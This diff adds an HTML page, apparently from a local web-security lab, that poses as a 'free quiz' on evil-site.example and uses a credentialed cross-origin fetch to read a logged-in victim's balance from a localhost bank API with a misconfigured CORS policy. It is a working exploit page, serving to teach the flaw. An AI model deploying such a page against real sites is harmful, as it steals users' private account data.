@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Totally Not Your Bank · Free Quiz</title>
+<style>
+  body{font-family:system-ui,sans-serif;margin:2rem;color:#222}
+  h1{color:#b00}
+  pre{background:#0f172a;color:#4ade80;padding:1rem;border-radius:8px;overflow:auto}
+  .tag{font:12px monospace;color:#666}
+</style>
+</head>
+<body>
+  <h1>😈 evil-site.example</h1>
+  <p class="tag">Open this page as <b>http://localhost:8095/labs/attack-cors.html</b>. Different PORT = different
+     ORIGIN from the bank (<b>http://localhost:8080</b>) so CORS applies, but same SITE (both "localhost") so the
+     session cookie is still a first-party cookie and gets sent — unlike 127.0.0.1, which browsers treat as third-party.</p>
+  <p>You came here for a free quiz. Meanwhile this page silently reads your bank account:</p>
+  <pre id="out">contacting your bank…</pre>
+
+  <script>
+    // Cross-ORIGIN request to the bank's API, carrying the victim's cookie.
+    // It succeeds only because api/balance.php reflects our Origin and allows credentials.
+    fetch("http://localhost:8080/api/balance.php", { credentials: "include" })
+      .then(r => r.json())
+      .then(d => { document.getElementById("out").textContent = "STOLEN FROM THE BANK:\n\n" + JSON.stringify(d, null, 2); })
+      .catch(e => { document.getElementById("out").textContent = "Request failed: " + e + "\n(Is the bank running on :8080 and are you logged in?)"; });
+  </script>
+</body>
+</html>
